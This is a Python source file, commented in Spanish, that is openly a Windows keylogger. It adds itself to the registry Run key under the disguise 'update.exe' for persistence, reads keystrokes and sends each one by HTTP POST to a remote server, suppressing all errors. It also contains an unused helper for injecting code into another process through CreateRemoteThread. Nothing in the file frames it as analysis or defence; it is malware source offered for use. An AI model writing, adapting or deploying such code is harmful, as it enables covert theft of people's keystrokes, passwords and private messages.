import os
import sys
import time
import winreg
import ctypes
import threading
import requests
import msvcrt
import win32api
import win32process

# Configuración del servidor
SERVER_URL = "http://tudominio.com/api/teclas"

# Función para enviar datos
def enviar_datos(teclas):
    try:
        requests.post(SERVER_URL, json={"teclas": teclas})
    except:
        pass

# Función para inyectar código en un proceso
def inyectar_codigo(proceso_id, codigo):
    # Obtener el handle del proceso
    proceso = win32api.OpenProcess(win32process.PROCESS_ALL_ACCESS, False, proceso_id)
    # Crear un nuevo hilo en el proceso objetivo
    ctypes.windll.kernel32.CreateRemoteThread(proceso, None, 0, codigo, 0, 0, 0)

# Función para ejecutar al inicio
def configurar_inicio():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "update.exe", 0, winreg.REG_SZ, sys.executable + " update.py")
    winreg.CloseKey(key)

# Función principal del keylogger
def keylogger():
    while True:
        try:
            tecla = msvcrt.getch().decode()
            if tecla:
                enviar_datos(tecla)
        except:
            pass

# Ejecutar el keylogger en segundo plano
if __name__ == "__main__":
    configurar_inicio()
    keylogger()
